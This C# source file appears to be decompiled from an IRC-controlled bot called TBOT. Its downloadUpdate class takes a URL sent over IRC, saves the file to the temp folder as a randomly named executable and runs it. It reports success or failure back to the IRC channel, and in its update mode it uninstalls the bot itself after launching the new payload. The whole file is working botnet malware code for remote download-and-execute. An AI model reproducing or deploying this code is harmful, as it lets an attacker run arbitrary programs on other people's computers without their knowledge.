using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace TBOT;

internal class downloadUpdate
{
	private static string _args;

	private static void download()
	{
		string[] array = (_args.Contains(" ") ? _args.Split(new char[1] { ' ' }) : new string[1] { _args });
		string text = Path.GetTempPath() + "\\junk" + new Random().Next(int.MinValue, int.MaxValue) + ".exe";
		if (array.Length > 1)
		{
			text = array[1];
		}
		text = text.Replace("%mainDrive%", Path.GetTempPath()[0].ToString());
		WebClient webClient = new WebClient();
		DateTime now = DateTime.Now;
		bool flag = false;
		try
		{
			webClient.DownloadFile(new Uri(array[0]), text);
		}
		catch (Exception)
		{
			flag = true;
			Irc.WriteTo(Config.ircChannel, "Failed to download file");
		}
		DateTime now2 = DateTime.Now;
		if ((array.Length == 1 || (array.Length == 3 && array[2].ToString().ToLower() == "true")) && !flag)
		{
			try
			{
				Process.Start(text);
			}
			catch (Exception)
			{
				Irc.WriteTo(Config.ircChannel, "Failed to execute file");
			}
		}
		if (!flag)
		{
			Irc.WriteTo(Config.ircChannel, "Done Downloading File (~" + (now - now2).TotalSeconds + "s)");
		}
	}

	private static void install()
	{
		string[] array = (_args.Contains(" ") ? _args.Split(new char[1] { ' ' }) : new string[1] { _args });
		string text = Path.GetTempPath() + "\\junk" + new Random().Next(int.MinValue, int.MaxValue) + ".exe";
		if (array.Length > 1)
		{
			text = array[1];
		}
		text = text.Replace("%mainDrive%", Path.GetTempPath()[0].ToString());
		WebClient webClient = new WebClient();
		DateTime now = DateTime.Now;
		bool flag = false;
		try
		{
			webClient.DownloadFile(new Uri(array[0]), text);
		}
		catch (Exception)
		{
			Irc.WriteTo(Config.ircChannel, "Failed to download file");
		}
		DateTime now2 = DateTime.Now;
		if (!flag)
		{
			try
			{
				Process.Start(text);
			}
			catch (Exception)
			{
				Irc.WriteTo(Config.ircChannel, "Failed to execute");
			}
		}
		if (!flag)
		{
			Irc.WriteTo(Config.ircChannel, "Done Downloading File (~" + (now2 - now).TotalSeconds + "s), uninstalling self.");
		}
		Install.uninstall(text);
	}

	public static void downloadThread(string pass)
	{
		_args = pass;
		new Thread(download).Start();
	}

	public static void updateThread(string pass)
	{
		_args = pass;
		new Thread(install).Start();
	}
}
